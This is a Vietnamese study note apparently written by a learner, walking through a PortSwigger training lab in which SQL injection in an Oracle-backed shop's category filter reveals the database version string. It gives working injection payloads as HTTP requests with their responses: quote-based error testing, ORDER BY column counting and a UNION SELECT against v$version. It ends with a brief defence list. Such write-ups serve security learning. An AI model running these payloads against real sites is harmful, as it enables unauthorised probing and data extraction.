# Lab — SQL injection attack, querying the database type and version on Oracle (SQLi / Apprentice)

-mô tả: lab shop chạy Oracle, filter `category` dính SQLi, query trả về 2 cột. Mục tiêu chỉ là làm version string của DB hiện ra bằng UNION — nhưng để làm được phải qua đúng 2 bước quen thuộc: đếm cột, rồi tìm cột chứa text.

> [!NOTE] đề nói gì
> - link lab: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
> - endpoint dính lỗi: `/filter?category=...`
> - mục tiêu: hiển thị version string của database.
> - hint của đề: Oracle bắt buộc `SELECT ... FROM`, select literal thì dùng `dual`, ví dụ `UNION SELECT 'abc' FROM dual`.
> - liên quan: [[các bước thu thập thông tin về csdl]], [[SQL cheet sheet]].

### quá trình suy nghĩ (từ quan sát tới kết quả)

1. **quan sát:** `category=Accessories` → 200, ra danh sách sản phẩm. Thêm `'` → 500 ngay => tham số ghép thẳng vào query.
2. **đếm cột:** `ORDER BY 1--` → 200, `2--` → 200, `3--` → 500 => query trả về **2 cột**. Giống lab trước, nhưng vẫn phải đo chứ không đoán.
3. **chọn hàm đọc version:** mỗi DB một kiểu — `@@version` cho MySQL/MSSQL, `version()` cho Postgres, `banner` trong `v$version` cho Oracle. Đề đã nói Oracle nên mình đi thẳng `v$version`, không thử mấy hàm kia làm gì cho mất công.
4. **nhớ bẫy cũ:** lần trước mình dính lỗi viết `UNION SELECT 'x', NULL--` mà quên `FROM` nên 500. Lần này nhớ luôn: `v$version` là bảng có sẵn của Oracle (data dictionary), select từ nó không cần `dual`.
5. **test:** `' UNION SELECT banner, NULL FROM v$version--` → 200, version string hiện lên trang.
6. **kết quả:** lab tự đánh solved. `v$version` trả nhiều dòng nên trang hiện nhiều "sản phẩm" — mỗi dòng là một banner: Oracle Database 11g, PL/SQL, CORE, TNS, NLSRTL.

### hướng giải (checklist)

- [ ] chèn `'` vào `category` xác nhận lỗi SQL
- [ ] `ORDER BY 1->`, `2->`, ... đến khi 500 thì số cột = n - 1
- [ ] chọn đúng hàm version theo DB (Oracle: `v$version.banner`)
- [ ] `' UNION SELECT banner, NULL FROM v$version--` (nhớ `FROM`)
- [ ] thấy version string là solved

### giải

xác nhận lỗi:

```
GET /filter?category=Accessories' HTTP/1.1
-> 500
```

đếm cột:

```
GET /filter?category=Accessories' ORDER BY 1-- HTTP/1.1
-> 200

GET /filter?category=Accessories' ORDER BY 2-- HTTP/1.1
-> 200

GET /filter?category=Accessories' ORDER BY 3-- HTTP/1.1
-> 500
=> query trả về đúng 2 cột
```

đọc version:

```
GET /filter?category=Accessories' UNION SELECT banner, NULL FROM v$version-- HTTP/1.1
-> 200
```

response hiện ra (mỗi dòng của `v$version` thành 1 item):

```
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
CORE    11.2.0.2.0    Production
TNS for Linux: Version 11.2.0.2.0 - Production
NLSRTL Version 11.2.0.2.0 - Production
```

```
-> banner "Congratulations, you solved the lab!"
=> solved
```

### bài học

> [!NOTE]
> - Oracle: `SELECT` phải có `FROM`; select literal thì `FROM dual`; select version thì `FROM v$version` và lấy cột `banner`.
> - `v$version` trả **nhiều dòng**, không phải 1 chuỗi — nên đừng ngạc nhiên khi trang hiện 5 item.
> - Biết DB là gì thì mọi bước sau mới đúng syntax: Oracle dùng `dual`, `||`, `all_tables`/`all_tab_columns`; MySQL/Postgres dùng `information_schema`, `CONCAT`, `SLEEP`/`pg_sleep`.
> - Phân biệt với lab **listing database contents on Oracle**: bài đó phải tự tìm bảng/cột rồi dump users, còn bài này chỉ cần đọc version là xong.
> - defense: query tham số hoá, không trả lỗi SQL ra ngoài, tài khoản DB least privilege.
> - liên quan: [[lys thuyet sql injection]], [[xác định số cột&kiểu dl]], [[các bước thu thập thông tin về csdl]], [[Lab-SQLi UNION determine columns]], [[Lab-SQLi listing database contents Oracle]]; câu hỏi phỏng vấn: [[tra loi pv chi tiet P1]].
